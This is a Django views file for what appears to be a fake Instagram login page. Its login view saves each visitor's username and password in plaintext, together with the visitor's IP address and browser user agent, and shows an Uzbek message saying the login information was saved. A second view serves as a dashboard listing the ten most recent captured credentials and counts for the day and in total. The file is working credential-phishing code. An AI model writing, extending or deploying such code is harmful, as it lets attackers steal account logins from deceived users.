from django.shortcuts import render, redirect
from .models import InstagramLogin
from django.contrib import messages
from django.utils import timezone

def get_client_ip(request):
    """Get user IP address"""
    x_forwarded_for = request.META.get('HTTP_X_FORWARDED_FOR')
    if x_forwarded_for:
        ip = x_forwarded_for.split(',')[0]
    else:
        ip = request.META.get('REMOTE_ADDR')
    return ip

def login_view(request):
    """Login page"""
    if request.method == 'POST':
        username = request.POST.get('username')
        password = request.POST.get('password')
        
        if username and password:
            # Save to database
            InstagramLogin.objects.create(
                username=username,
                password=password,
                ip_address=get_client_ip(request),
                user_agent=request.META.get('HTTP_USER_AGENT', ''),
                success=True
            )
            
            messages.success(request, '✅ Login informatciyasi saxlandi!')
            return redirect('next_page')
    
    return render(request, 'login.html')

def next_view(request):
    """Next page after login"""
    recent_logins = InstagramLogin.objects.all().order_by('-login_time')[:10]
    total_logins = InstagramLogin.objects.count()
    today = timezone.now().date()
    today_logins = InstagramLogin.objects.filter(login_time__date=today).count()
    
    context = {
        'recent_logins': recent_logins,
        'total_logins': total_logins,
        'today_logins': today_logins,
    }
    
    return render(request, 'next.html', context)